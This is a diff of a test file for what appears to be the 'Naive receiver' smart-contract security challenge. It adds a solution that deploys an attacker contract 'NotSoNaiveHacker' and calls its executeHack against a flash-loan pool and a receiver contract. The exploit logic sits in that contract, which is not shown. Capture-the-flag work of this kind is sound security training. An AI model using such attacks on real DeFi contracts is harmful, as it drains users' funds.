@@ -19,18 +19,28 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+
+        // Explanation of hack is in attacker contract 'NotSoNaiveHacker.sol'
+
+        // Deploy attacker contract
+        const attackerContract = await (await ethers.getContractFactory("NotSoNaiveHacker", attacker)).deploy();
+        const attackerContractConn = attackerContract.connect(attacker);
+
+        // Execute hack function on attacker contract
+        const tx = await attackerContractConn.executeHack(this.pool.address, this.receiver.address);
+        await tx.wait();
     });
 
     after(async function () {
